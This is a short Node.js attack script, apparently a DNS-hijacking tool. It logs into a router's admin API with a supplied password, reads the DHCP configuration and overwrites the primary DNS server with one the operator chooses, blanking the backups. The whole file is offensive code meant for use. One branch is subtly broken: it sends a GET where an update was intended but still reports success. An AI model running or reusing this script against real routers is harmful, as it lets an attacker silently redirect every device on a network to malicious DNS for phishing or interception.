const axios = require('axios');
var args = process.argv.slice(2)

ip = args[0]
porta = args[1]
senha = args[2]
dns = args[3]

url = 'http://'+ip+':'+porta+'/'

console.log('\n[+] Logging in > '+ip+':'+porta+' ("'+senha+'")');

axios.post(url+'v1/system/login', {
    username: 'admin',
    password: senha
  })
  .then(function (response) {
    console.log('\n-----------------------------------------------------\n[+] Successfuly logged in! (Status Code: '+response.status+')');
    console.log('[+] Password used > '+senha+'\n');
    console.log('[+] Fetching for current DHCP settings...')
    axios.get(url+'v1/service/dhcp')
        .then(function (dhcpinfo) {
            if (dhcpinfo.data.enabled === 1) {
                console.log('[+] DHCP Enabled: Yes');
                console.log('[+] DNS 1: '+dhcpinfo.data.dns1);
                console.log('[+] DNS 2: '+dhcpinfo.data.dns2);
                console.log('[+] DNS 3: '+dhcpinfo.data.dns3);
                axios.put(url+'v1/service/dhcp', {
                    enabled: 1,
                    lease: dhcpinfo.data.lease,
                    start_ip: dhcpinfo.data.start_ip,
                    end_ip: dhcpinfo.data.end_ip,
                    domain_name: dhcpinfo.data.domain_name,
                    dns1: dns,
                    dns2: '0.0.0.0',
                    dns3: '0.0.0.0'
                })
                console.log('\n[+] Changed the router\'s primary DNS to '+dns+'.\n-----------------------------------------------------\n');
            } else {
                console.log('[+] DHCP Enabled: No');
                console.log('[+] DNS 1: '+dhcpinfo.data.dns1);
                console.log('[+] DNS 2: '+dhcpinfo.data.dns2);
                console.log('[+] DNS 3: '+dhcpinfo.data.dns3);
                axios.get(url+'v1/service/dhcp', {
                    enabled: 1,
                    lease: dhcpinfo.data.lease,
                    start_ip: dhcpinfo.data.start_ip,
                    end_ip: dhcpinfo.data.end_ip,
                    domain_name: dhcpinfo.data.domain_name,
                    dns1: dns,
                    dns2: '0.0.0.0',
                    dns3: '0.0.0.0'
                })
                console.log('\n[+] DHCP Enabled and set the router\'s primary DNS to '+dns+'.\n-----------------------------------------------------\n');
            }
        })
  })
  .catch(function (error) {
    console.log(error.code);
  });
